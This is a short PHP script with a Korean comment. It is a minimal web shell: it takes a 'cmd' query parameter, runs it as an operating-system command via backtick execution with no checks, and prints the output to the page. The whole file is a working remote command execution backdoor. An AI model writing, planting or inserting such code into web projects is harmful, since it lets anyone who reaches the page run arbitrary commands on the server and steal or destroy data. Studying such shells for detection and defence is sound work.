<?
    $cmd = $_GET['cmd'];
    $result = `$cmd`;
    $result = str_replace("\n","<br />",$result);
    echo $result;
    //'cmd'를 인자로 받아, backtick을 이용해 시스템 명령어 실행